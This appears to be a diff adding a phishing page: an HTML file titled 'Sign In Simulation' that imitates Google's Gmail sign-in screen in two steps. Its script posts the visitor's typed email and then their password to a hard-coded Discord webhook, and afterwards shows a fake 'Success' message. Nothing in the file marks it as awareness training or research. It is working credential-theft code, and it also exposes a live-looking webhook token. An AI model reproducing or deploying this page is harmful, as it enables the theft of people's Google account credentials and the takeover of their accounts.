@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In Simulation</title>
+    <style>
+        body {
+            font-family: 'segoe ui', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: white;
+            width: 450px;
+            padding: 48px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+        .logo {
+            width: 75px;
+            margin-bottom: 10px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin: 0 0 8px 0;
+            color: #202124;
+        }
+        p {
+            font-size: 16px;
+            color: #202124;
+            margin-bottom: 40px;
+        }
+        .input-container {
+            position: relative;
+            margin-bottom: 10px;
+            text-align: left;
+        }
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        input:focus {
+            border: 2px solid #1a73e8;
+            padding: 12px 14px;
+        }
+        .forgot-link {
+            display: block;
+            text-align: left;
+            color: #1a73e8;
+            font-weight: 500;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 30px;
+            cursor: pointer;
+        }
+        .info-text {
+            text-align: left;
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.4;
+            margin-bottom: 40px;
+        }
+        .info-text a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .footer-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .create-account {
+            color: #1a73e8;
+            font-weight: 500;
+            font-size: 14px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .btn-next {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            padding: 15px 0;
+            font-size: 12px;
+            color: #70757a;
+        }
+        .bottom-nav-links {
+            display: flex;
+            justify-content: flex-end;
+            width: 450px;
+            gap: 20px;
+        }
+        .bottom-nav-links a {
+            color: #70757a;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
+        <div id="content">
+            <h1>Sign in</h1>
+            <p>to continue to Gmail</p>
+            <div class="input-container">
+                <input type="text" id="userInput" placeholder="Email or phone">
+            </div>
+            <a class="forgot-link">Forgot email?</a>
+            <div class="info-text">
+                Not your computer? Use Private Browsing windows to sign in. <a href="#">Learn more</a>
+            </div>
+            <div class="footer-actions">
+                <a class="create-account">Create account</a>
+                <button class="btn-next" onclick="handleNext()">Next</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="bottom-nav">
+        <div style="width: 450px; text-align: left;">English (United States) ▾</div>
+        <div class="bottom-nav-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1523059789905788969/tnYym0IjykEnDXxky9Kr3lcIQ2MyFVdvCj14hzIqxNwxRR88D24-_V3uUOReAIcZZSbR";
+        let capturedEmail = "";
+
+        async function sendToDiscord(message) {
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: message })
+                });
+            } catch (e) {}
+        }
+
+        async function handleNext() {
+            const input = document.getElementById('userInput');
+            capturedEmail = input.value;
+            if (!capturedEmail) return;
+
+            await sendToDiscord(`Email: ${capturedEmail}`);
+            showPasswordPage();
+        }
+
+        function showPasswordPage() {
+            document.getElementById('content').innerHTML = `
+                <h1>Sign in</h1>
+                <p>Welcome, ${capturedEmail}</p>
+                <div class="input-container">
+                    <input type="password" id="passwordInput" placeholder="Enter your password">
+                </div>
+                <a class="forgot-link">Forgot password?</a>
+                <div class="info-text">
+                    Use your password to access your account securely.
+                </div>
+                <div class="footer-actions">
+                    <a class="create-account">Create account</a>
+                    <button class="btn-next" onclick="handlePassword()">Next</button>
+                </div>
+            `;
+        }
+
+        async function handlePassword() {
+            const passInput = document.getElementById('passwordInput');
+            const password = passInput.value;
+            if (!password) return;
+
+            await sendToDiscord(`Password for ${capturedEmail}: ${password}`);
+            
+            // Optional: Redirect or show success
+            document.getElementById('content').innerHTML = `<h1>Success</h1><p>You have been signed in.</p>`;
+        }
+    </script>
+</body>
+</html>
